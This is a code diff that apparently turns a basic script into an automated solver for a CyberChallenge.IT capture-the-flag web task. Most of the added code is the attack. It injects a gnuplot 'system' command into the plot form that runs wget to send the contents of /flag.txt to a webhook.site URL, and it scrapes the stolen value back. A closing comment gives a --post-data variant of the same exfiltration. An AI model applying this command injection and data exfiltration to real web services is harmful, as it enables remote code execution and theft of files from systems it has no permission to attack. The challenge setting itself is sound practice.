@@ -1,7 +1,43 @@
-import requests
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+import urllib.parse
+from pyvirtualdisplay import Display
+import time
 
+# Open a virtual windows
+display = Display(visible=0, size=(800, 600))
+display.start()
+
+# Open a webhook page and take the url
+webook_monitor = 'https://webhook.site'
+webhook_driver = webdriver.Chrome()
+webhook_driver.get(webook_monitor)
+webhook = webhook_driver.current_url.replace('#!/', '')
+
+# Open challenge's page
 url = 'http://plottyboy.challs.cyberchallenge.it/'
-print(requests.head(url).headers)
+driver = webdriver.Chrome()
+driver.get(url)
+
+# Find input form and send the payload
+plot = driver.find_element(By.NAME, 'data')
+plot.send_keys('x**2; system "wget ' + webhook + '/$(cat /flag.txt)')
+enter = driver.find_element(By.XPATH, '/html/body/section/div[2]/form/div[2]/input')
+enter.click()
+
+# Wait the response
+time.sleep(3)
+
+# Find the flag into page source
+page = webhook_driver.page_source
+flag = page[page.find('CCIT'):page.find('%7D') + 3]
+flag = urllib.parse.unquote(flag)
+print(flag)
+
+# Close all virtual windows
+driver.close()
+webhook_driver.close()
 
 # SOLUTION:
 # x**2; system "wget --post-data=$(cat /flag.txt) [WEBHOOK URL]"
